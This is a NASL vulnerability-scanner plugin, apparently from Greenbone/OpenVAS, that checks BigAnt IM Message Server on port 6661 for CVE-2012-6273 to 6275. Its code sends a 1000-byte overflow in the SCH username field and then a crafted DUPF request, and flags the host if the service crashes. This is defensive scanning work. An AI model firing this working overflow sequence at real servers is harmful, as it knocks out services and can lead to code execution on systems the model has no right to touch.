if(description){
	script_oid( "1.3.6.1.4.1.25623.1.0.802051" );
	script_version( "2021-08-10T15:24:26+0000" );
	script_bugtraq_id( 57214 );
	script_cve_id( "CVE-2012-6273", "CVE-2012-6274", "CVE-2012-6275" );
	script_tag( name: "cvss_base", value: "10.0" );
	script_tag( name: "cvss_base_vector", value: "AV:N/AC:L/Au:N/C:C/I:C/A:C" );
	script_tag( name: "last_modification", value: "2021-08-10 15:24:26 +0000 (Tue, 10 Aug 2021)" );
	script_tag( name: "creation_date", value: "2013-03-04 11:45:47 +0530 (Mon, 04 Mar 2013)" );
	script_name( "BigAntSoft BigAnt IM Message Server Multiple Vulnerabilities" );
	script_category( ACT_DENIAL );
	script_copyright( "Copyright (C) 2013 Greenbone Networks GmbH" );
	script_family( "Buffer overflow" );
	script_dependencies( "find_service.sc" );
	script_require_ports( 6661 );
	script_xref( name: "URL", value: "http://www.kb.cert.org/vuls/id/990652" );
	script_xref( name: "URL", value: "http://packetstormsecurity.com/files/117864" );
	script_xref( name: "URL", value: "http://packetstormsecurity.com/files/120404" );
	script_xref( name: "URL", value: "http://packetstormsecurity.com/files/120405" );
	script_tag( name: "impact", value: "Successful exploitation could allow attackers to execute arbitrary
  code or can upload arbitrary files or manipulate SQL queries by injecting
  arbitrary SQL queries." );
	script_tag( name: "affected", value: "BigAnt Server version 2.97 SP7, Other versions may also be
  affected" );
	script_tag( name: "insight", value: "Multiple flaws are due to:

  - Improper validation of user input when handling the filename header
  in SCH requests or when handling the userid component in DUPF requests.

  - Not properly verify or sanitize user-uploaded files.

  - Not properly sanitizing user-supplied input to the 'Account/Full Name'
  field when performing an Account/Full Name user search." );
	script_tag( name: "solution", value: "No known solution was made available for at least one year since the disclosure of this vulnerability. Likely none will be provided anymore. General solution options are to upgrade to a newer release, disable respective features, remove the product or replace the product by another one." );
	script_tag( name: "summary", value: "The host is running BigAntSoft BigAnt IM Message Server and
  is prone to multiple vulnerabilities." );
	script_tag( name: "solution_type", value: "WillNotFix" );
	script_tag( name: "qod_type", value: "remote_vul" );
	exit( 0 );
}
port = 6661;
if(!get_port_state( port )){
	exit( 0 );
}
soc = open_sock_tcp( port );
if(!soc){
	exit( 0 );
}
common_req = NASLString( "SCH 16", "\x0a", "cmdid: 1", "\x0a", "content-length: 0", "\x0a", "content-type: Application/Download", "\x0a", "filename: Uujj.txt", "\x0a", "modified: 1248-21-32 08:13:01", "\x0a", "pclassid: 102", "\x0a", "pobjid: 1", "\x0a", "rootid: 1", "\x0a", "sendcheck: 1", "\x0a", "source_cmdname: DUPF", "\x0a", "source_content-length: 116619", "\x0a", "userid: 5", "\x0a" );
normal_req = NASLString( common_req, "username: bstest", "\x0a", "\x0a" );
send( socket: soc, data: normal_req );
normal_res = recv( socket: soc, length: 1024 );
if(!ContainsString( normal_res, "SCH 1" ) || !ContainsString( normal_res, "scmderid:" )){
	close( soc );
	exit( 0 );
}
bof = crap( length: 1000, data: "A" );
attack_req1 = NASLString( common_req, "username: ", bof, "\x0a", "\x0a" );
send( socket: soc, data: attack_req1 );
attack_res1 = recv( socket: soc, length: 1024 );
scmderid = eregmatch( pattern: "scmderid: (\\{.*\\})", string: attack_res1 );
if(isnull( scmderid )){
	close( soc );
	exit( 0 );
}
attack_req2 = NASLString( "DUPF 16", "\x0a", "cmdid: 1", "\x0a", "content-length: 14", "\x0a", "content-type: Application/Download", "\x0a", "filename: Uujj.txt", "\x0a", "modified: 1248-21-32 08:13:01", "\x0a", "pclassid: 102", "\x0a", "pobjid: 1", "\x0a", "rootid: 1", "\x0a", "scmderid: ", scmderid[1], "\x0a", "sendcheck: 1", "\x0a", "userid: 5", "\x0a", "username: xmcjm", "\x0a", "\x0a", "KiLTTSQlSwtmiY" );
send( socket: soc, data: attack_req2 );
attack_res2 = recv( socket: soc, length: 1024 );
close( soc );
sleep( 2 );
soc2 = open_sock_tcp( port );
if(!soc2){
	security_message( port );
	exit( 0 );
}
close( soc2 );

